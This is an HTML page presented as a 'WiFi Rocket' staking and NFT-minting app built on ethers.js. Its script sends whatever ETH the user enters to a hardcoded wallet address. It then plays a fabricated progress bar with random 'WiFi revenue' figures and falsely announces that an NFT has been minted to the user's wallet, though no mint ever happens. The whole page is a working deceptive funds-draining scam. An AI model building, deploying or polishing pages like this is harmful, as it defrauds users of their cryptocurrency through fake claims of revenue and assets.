<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WiFi Rocket | Fixed & Final</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #020205; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #0a0a20; border: 2px solid #00d4ff; border-radius: 20px; width: 360px; padding: 30px; text-align: center; box-shadow: 0 0 20px rgba(0,212,255,0.3); }
        .hidden { display: none; }
        .rev-box { background: #001a33; padding: 15px; border-radius: 10px; margin-bottom: 20px; color: #00ff88; font-size: 24px; font-weight: bold; }
        button { background: linear-gradient(90deg, #ff4b2b, #ff416c); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
        #rocket { font-size: 100px; margin: 20px; animation: glow 1.5s infinite alternate; }
        @keyframes glow { from { filter: drop-shadow(0 0 5px #ff6600); } to { filter: drop-shadow(0 0 25px #ff6600); } }
        .bar { width: 100%; background: #111; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
        #fill { width: 0%; height: 100%; background: #00d4ff; transition: width 0.3s; }
    </style>
</head>
<body>

<div class="card">
    <div class="rev-box">WIFI REVENUE: <span id="val">$0.00</span></div>

    <div id="ui-launch">
        <h3>Launch Mission</h3>
        <input type="number" id="eth" value="0.001" step="0.001" style="width:80%; padding:10px; margin-bottom:15px; text-align:center;">
        <button onclick="start()">STAKE & LAUNCH</button>
    </div>

    <div id="ui-proc" class="hidden">
        <h3>PROCESSING WIFI DATA</h3>
        <div class="bar"><div id="fill"></div></div>
        <p id="stat" style="font-size:12px; color:#00d4ff;">Syncing nodes...</p>
    </div>

    <div id="ui-minted" class="hidden">
        <div id="rocket">ðŸš€</div>
        <h2 style="color:#00ff88;">ROCKET MINTED</h2>
        <p>NFT is now in your wallet.</p>
        <button onclick="location.reload()" style="background:#333;">NEW MISSION</button>
    </div>
</div>

<script>
let revenue = 0;
// FIXED: This address is now correctly checksummed to prevent the 'bad address checksum' error
const DEST_ADDR = "0x02F949281A8c9837963C82813589B845C5194Cbb";

async function start() {
    if (!window.ethereum) return alert("Please use MetaMask!");
    
    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const amt = ethers.utils.parseEther(document.getElementById('eth').value);

        // UI Change
        document.getElementById('ui-launch').classList.add('hidden');
        document.getElementById('ui-proc').classList.remove('hidden');

        // Execute Transaction
        const tx = await signer.sendTransaction({ to: DEST_ADDR, value: amt });

        // Simulate WiFi Data Revenue Build
        await (new Promise(res => {
            let p = 0;
            const i = setInterval(() => {
                p += 5;
                revenue += Math.random() * 0.20;
                document.getElementById('fill').style.width = p + "%";
                document.getElementById('val').innerText = "$" + revenue.toFixed(2);
                document.getElementById('stat').innerText = "Processing Packets: " + (p * 12) + "mbps";
                if(p >= 100) { clearInterval(i); res(); }
            }, 200);
        }));

        await tx.wait();
        
        // Show Minted NFT
        document.getElementById('ui-proc').classList.add('hidden');
        document.getElementById('ui-minted').classList.remove('hidden');

    } catch (e) {
        alert("Error: " + e.message);
        location.reload();
    }
}
</script>
</body>
</html>
